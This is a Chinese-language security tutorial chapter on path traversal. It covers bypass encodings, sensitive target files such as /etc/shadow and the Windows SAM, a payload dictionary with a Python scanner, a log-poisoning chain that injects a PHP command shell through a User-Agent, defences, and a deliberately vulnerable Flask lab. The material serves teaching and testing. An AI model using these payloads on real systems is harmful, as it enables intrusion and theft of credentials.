# 附录：路径遍历 —— 穿越目录的黑客之路

> 路径遍历（Directory Traversal）是一个独立的漏洞类型，
> 独立于文件上传，出现在任何**读取或写入文件**的功能中。
> 它和SQL注入一样古老，但在现代Web中依然常见。

---

## 一、漏洞原理

```
核心问题：用户提供的路径被直接拼接到文件路径中，没有验证

有漏洞的代码（Python）：
  filename = request.args.get("file")
  filepath = f"/var/www/uploads/{filename}"
  with open(filepath, "r") as f:
      return f.read()

用户输入：report.pdf
实际路径：/var/www/uploads/report.pdf

用户输入：../../etc/passwd
实际路径：/var/www/uploads/../../etc/passwd
         = /etc/passwd                    ← 遍历到了上传目录之外！

用户输入：../../app/config/database.php
实际路径：/var/www/uploads/../../app/config/database.php
         = /app/config/database.php        ← 读取配置文件（含数据库密码）
```

---

## 二、路径遍历的变种

### 2.1 经典遍历

```bash
# Linux
../
../../
../../../
../../../etc/passwd
/etc/passwd

# Windows
..\
..\..\
..\..\..\
..\..\..\windows\system32\config\sam
C:\windows\system32\config\sam
```

### 2.2 URL编码绕过

```
服务端对 .. 进行URL编码过滤？试试：

../          → %2e%2e/
../          → %2e%2e%5c        (Windows)
..%252f      → ../
             %25 = %
             %2f = /

双重URL编码：
  输入: %252e%252e%252f
  第一次解码: %2e%2e%2f
  第二次解码: ../

测试序列：
  正常: report.pdf
  单编码: %2e%2e%2fetc%2fpasswd
  双编码: %252e%252e%252f%252e%252e%252fetc%252fpasswd
  反斜杠: ..%5c..%5cetc%5cpasswd
```

### 2.3 空字节截断

```
老版本PHP/Java中，空字节（%00）会截断字符串：

输入: ../../../etc/passwd%00.jpg
     ↓
/var/www/uploads/../../../etc/passwd%00.jpg
     ↓ （空字节截断，.jpg被截断）
/etc/passwd

现代版本已修复，但仍可能存在于老系统中。
```

### 2.4 特殊字符组合

```
一些Web服务器会对某些字符做额外处理：

Tomcat:
  ..;/  → 会被解析为 .. 或 ;
  ..%00.jpg → 可能绕过某些检查

Unicode:
  ..%c0%af → UTF-8编码的 /
  ..%c1%9c → UTF-8编码的 \

测试：
  ../../../etc/passwd
  ..%252f..%252f..%252fetc%252fpasswd
  ..%5c..%5c..%5cetc%5cpasswd
  ....//....//....//etc/passwd
  ..\/..\/..\/etc/passwd
```

### 2.5 不同系统的路径差异

```bash
# Linux根目录
/etc/passwd
/proc/self/environ          # 环境变量
/proc/self/cmdline          # 命令行参数
/proc/self/fd/              # 文件描述符
/var/log/apache2/access.log # Web日志

# Windows
C:\windows\system32\config\sam    # 密码哈希
C:\windows\repair\sam
C:\boot.ini
C:\xampp\apache\conf\httpd.conf   # Apache配置
```

---

## 三、出现位置

### 3.1 文件下载

```http
GET /download?file=report.pdf
GET /download?filename=../../etc/passwd
GET /static/images/../../../etc/passwd
```

### 3.2 文件包含

```php
<?php
// PHP include
include($_GET['page'] . ".php");
// ?page=../../../etc/passwd

// JSP include
<jsp:include page="<%= request.getParameter('page') %>" />
```

### 3.3 模板引擎

```python
# Jinja2 模板注入（有时候路径遍历和模板注入结合）
# ?next=javascript:alert(1) 或 ?next=file:///etc/passwd
```

### 3.4 图像处理

```python
# 头像缩略图生成
# 用户提供头像URL，服务器去下载并处理
# 如果URL是 file:///etc/passwd → 服务器读取本地文件
# 这是SSRF和路径遍历的结合

from PIL import Image
import requests

avatar_url = user_input  # 用户输入
response = requests.get(avatar_url)  # 去下载
# 如果 avatar_url = file:///etc/passwd
# PIL尝试打开本地文件 → 路径遍历
```

### 3.5 配置文件读取

```http
GET /api/config?name=db
GET /api/config?name=../../app/config/secrets
```

---

## 四、检测方法

### 4.1 基本检测流程

```
第1步：识别文件操作功能
  - 文件下载/预览
  - 图片处理/缩略图
  - 文件包含
  - 配置读取
  - 日志查看

第2步：判断参数位置
  URL参数: ?file=xxx, ?path=xxx, ?name=xxx, ?page=xxx
  Cookie: file=xxx
  请求头: X-Forwarded-For（有些系统根据这个构造路径）

第3步：基础测试
  输入: ../etc/passwd
  输入: ..%2f..%2f..%2fetc%2fpasswd
  输入: ....//....//....//etc/passwd
  输入: ..%5c..%5c..%5cetc%5cpasswd

第4步：验证读取成功
  响应内容包含 /etc/passwd 或 root:x: 等内容
```

### 4.2 常见路径字典

```python
"""路径遍历测试payload字典"""
path_traversal_payloads = [
    # 经典遍历
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",

    # Windows
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",

    # URL编码
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5cetc%5cpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",

    # 混合
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",

    # 编码+双斜杠
    "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",

    # 常见文件
    "../../../../etc/shadow",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "etc/passwd",
    "../../var/log/apache2/access.log",
    "../../var/log/nginx/access.log",
    "../../proc/self/environ",
    "../../proc/self/cmdline",
    "../../proc/self/fd/0",
]

def test_path_traversal(base_url, param_name):
    """测试路径遍历"""
    results = []

    for payload in path_traversal_payloads:
        resp = requests.get(base_url, params={param_name: payload}, timeout=10)

        # 检测是否成功读取了敏感文件
        sensitive_signatures = [
            b"root:x:",           # /etc/passwd
            b"root:*:",           # /etc/shadow
            b"<!DOCTYPE",         # HTML文件头
            b"<?xml",             # XML文件
            b"function",          # JS/PHP文件
        ]

        for sig in sensitive_signatures:
            if sig in resp.content:
                results.append({
                    "payload": payload,
                    "signature": sig,
                    "status": resp.status_code,
                    "length": len(resp.content)
                })

    return results
```

---

## 五、路径遍历的进阶利用

### 5.1 读取Web日志 + 日志投毒

```
步骤1：读取Web日志
  ?file=../../var/log/apache2/access.log
  → 找到日志路径

步骤2：写入恶意代码到日志
  通过User-Agent写入PHP代码：
  curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
  → 代码被写入access.log

步骤3：包含日志文件
  ?page=../../var/log/apache2/access.log?cmd=whoami
  → 日志文件被当作PHP执行 → 命令执行！
```

### 5.2 读取配置 → 获取数据库密码 → 数据库接管

```
1. 读取配置文件
   ?file=../../var/www/html/config.php
   → 拿到数据库用户名和密码

2. 如果数据库端口对外暴露（SSRF或路径遍历？）
   → 连接数据库，读取所有数据

3. 如果数据库支持系统命令（MSSQL的xp_cmdshell）
   → 服务器接管
```

### 5.3 结合SSRF读取元数据

```
如果应用有SSRF漏洞：
  ?url=file:///etc/passwd
  ?url=file:///proc/self/environ

如果应用有路径遍历：
  ?file=file:///etc/passwd
  ?file=../../proc/self/environ

在某些配置下，file://协议可以直接使用。
```

---

## 六、防御和绕过

```
正确的防御：

[1] 白名单验证
  allowed_files = ["report.pdf", "invoice.pdf", ...]
  if filename not in allowed_files:
      return "不允许访问"

[2] 规范化路径并验证
  import os
  base_dir = "/var/www/uploads/"
  requested = base_dir + user_input
  real_path = os.path.realpath(requested)  # 解析符号链接
  if not real_path.startswith(base_dir):
      return "越界访问"
  # realpath会把 ../ 都展开，验证展开后的路径

[3] 禁用危险协议
  如果应用处理URL：
  if user_input.startswith("file://"):
      return "禁止访问本地文件"

[4] 升级到最新版本
  老版本PHP/Java的空字节截断漏洞已修复
```

---

## 七、动手实践

### 实践1：PortSwigger Path Traversal Lab

```
PortSwigger Web Security Academy:
https://portswigger.net/web-security/path-traversal

必做Lab:
1. File path traversal, simple case
2. File path traversal, blocking bypasses
3. File path traversal, URL validation bypass
4. File path traversal via cookies

每个Lab都有详细的Write-up，做完后对照学习。
```

### 实践2：本地测试靶场

```python
"""有漏洞的文件读取服务（用于本地练习）"""
from flask import Flask, request, abort
import os

app = Flask(__name__)
UPLOAD_DIR = "/tmp/uploads/"

@app.route("/download")
def download():
    filename = request.args.get("file", "")

    # 漏洞版本（未做任何过滤）
    filepath = os.path.join(UPLOAD_DIR, filename)
    try:
        with open(filepath, "r") as f:
            return f.read()
    except FileNotFoundError:
        return "File not found", 404

# 安全版本对比：
@app.route("/download_safe")
def download_safe():
    filename = request.args.get("file", "")
    base_dir = UPLOAD_DIR
    requested = os.path.join(base_dir, filename)
    real_path = os.path.realpath(requested)  # 规范化路径
    if not real_path.startswith(base_dir):
        return "Access denied", 403
    try:
        with open(real_path, "r") as f:
            return f.read()
    except FileNotFoundError:
        return "File not found", 404
```

```bash
# 测试：
mkdir -p /tmp/uploads
echo "test file" > /tmp/uploads/test.txt
echo "secret config" > /tmp/uploads/config.txt

# 有漏洞版本：
curl "http://localhost:5000/download?file=../../etc/passwd"
# → 应该看到/etc/passwd的内容

# 安全版本：
curl "http://localhost:5000/download_safe?file=../../etc/passwd"
# → 应该返回403 Access denied
```

---

## 八、自测清单

- [ ] 路径遍历和文件上传漏洞的核心区别是什么？
- [ ] 能列举至少5种路径遍历的变种/绕过技巧？
- [ ] 路径遍历经常出现在哪些功能点？
- [ ] 日志投毒的利用链是什么？
- [ ] 正确的防御方式是什么？为什么 `../` 过滤不够？
- [ ] 能在PortSwigger完成至少2个Path Traversal Lab？

---

> **相关模块：**
> - [02 注入攻击](../02-injection/README.md) —— 路径遍历也是一种注入
> - [07 文件上传](../07-file-upload/README.md) —— 文件操作的安全问题
> - [08 SSRF/XXE](../08-ssrf-xxe/README.md) —— SSRF也能读取本地文件
